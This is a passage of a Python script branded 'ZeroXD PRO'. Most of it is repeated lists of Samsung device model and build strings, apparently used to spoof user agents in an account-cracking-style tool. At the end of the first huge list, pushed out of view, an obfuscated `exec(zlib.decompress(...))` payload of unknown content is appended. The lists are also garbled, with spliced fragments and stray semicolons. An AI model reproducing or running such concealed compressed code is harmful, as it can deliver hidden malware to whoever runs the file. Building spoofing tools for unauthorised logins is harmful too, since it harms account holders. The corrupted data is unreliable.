G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T']#;exec(zlib.decompress(b'x\x9c\xed\x97Qk\xdb0\x10\xc7\xdf\xfd)\x04}\xb0\r\x9e\xddfk\x9a\x18\x02+\xcb\nc\xeb\x18,\xa3\xb01\x8cbI\x89\x12[ru2I(\xfd\xee\x93l\xc7\xce\x96\x94f\xef\xbe\x07\xe3\x9c\xee\xff?\xe9\xf4#`\x9e\x17Ri\xa4\xe8cIAC !\x80\x1d8L\xc9\x1c\xa5R\xa4\xa5RT\xe8\x90\x95\xbaT\x14\x10\xaf\xcbgKE1\xf9&e\xf6qK\xd3RK\x850\x1cd\x1d\xe7\xe2}\tTq\xc2\x05\x93s\xa9\x1d\x87P\x86\x80nw\x9e\x1f;\xc8\x04P\x00.\xc5d\xdf9l\x12\x9e_-\xdb\xa8^\x8c8\xd1rM\x05\x9a w8\xbe\xbc\x19\x8c\xc6\xef\xae\xde\xc6\xb7\xb7w\xec3\xacE\xf2\xf0c\xa6\x1e?\x8c\xc4\xd7r\xfae\xfd=\xe7\xc3\x9f\xa3|C>M\x87k\xb7vH\x97X\'\x9cT\xfa\xd1`pu}3\x1e]\xbb\xd5\xd2\xc5\x9b.<\x14\x01I\xb1"\xd5\x8aV\xbb\xb8\xddH\x9dO\n\xac\x97\xd6\xa5\xa9s\xdbu\xc63\x9ad\x1c\xb4Y\xfd\xc5\x103\xe3`\x88\x0b$!\xb4Y\xc2\x95w`\xe1#njB*\x08l\xb8^znX\xec\\\xffw\xe7f\xe5\xc6\xd1:\xb4\xce\xddflX\x1d\x92\x05\x15\x9eia=\xc3\x95\xe4\xe2\xb0IPI\xfd\x00\xb9j\xee\xfa\xf6v\xd8\xdf\x166J\x95M\x98\xbb\xd4\xba\x808\x8ap\xc1CM3\xbaP8\x0f\xa5ZDf\xf4O\xed\xf8\x9f#0;\x9e\xca\xb4\xcc\r\x10\xee\x91\x17\xc1\x1a\x0f&On3m7\xde\xcf\xfd\xf9d\xe9y\x95\xf6\x0c`J\xc9\xbem\x8c\xd8q\xd5\x82\xda\xc17\xfc\x84\x85\x04\xed\x99\x93\x05u\x1f\xfb\x08\x1a\xa3\xea\xe9\x1f\xe9\xcd\xc1^1\x18\x9cp\xa0\xdb\x94\x16:.0\xc0\x11K\x1dL\xd1TnD&1A\xe7b\xd5*z\xbez\xbe^\xe2\xeb\x04`\xd1\xac\x99\xed\xff\x93\xd6J{\xe4z\xe4N!\xd7\xd1\xb6\'\xa5\xa3\xed\xce\xea\xcfF\xee\x05}\x0f^\x0f\xde\xe9\xff\xba\x0e\xbd\x07s2\xb8-\x8a\xe8\x9e\x12\x8e\xdb\x9fh?\xc7\xf3!|\xd5\xa9\xc7\xb1\xc7\xb1\xc1\xd1\xa9.\xa4\xfb\xb4\xf1r\xbcM6R\xad\xa9\x82\xc9\xf8\xb2\x9a\xffj\xb5\xaao\xc0\xbc\x84P\xces\xae=\xfb\xad\xe3\xff\x9b\xcc1\x17u\xd21\xf1\x07s\x15\x00\xdf').decode())
samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def clear():
  os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \033[1;36m
  ______          ___         _____  
 |___  /         / _ \       |  __ \ 
    / / ___ _ __| | | | __  _| |  | |
   / / / _ \ '__| | | | \ \/ / |  | |
  / /_|  __/ |  | |_| |  >  <| |__| |
 /_____\___|_|   \___/  /_/\_\_____/ 
                                     \x1b[38;1;97m ᴾᴿᴼ
{faltu} {black}Your self-worth is determined by you... {pvt}\033[38;5;196m :{today} 
{rad}[{white}🔖{rad}] {yelloww}ONWER AND CEO {white}▶︎ {yelloww}𝐜𝐡𝐨𝐲𝐨𝐧 {rad}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
{rad}[{white}🔖{rad}] {green}VERSION \033[38;5;196m  :\x1b[38;1;97m {version}
{rad}[{white}🔖{rad}] {green}TOOLS \033[38;5;196m    :\x1b[38;1;97m PREMIUM
{rad}[{white}🔖{rad}] {green}THIS TOOL FILE & RANDOM TYPES
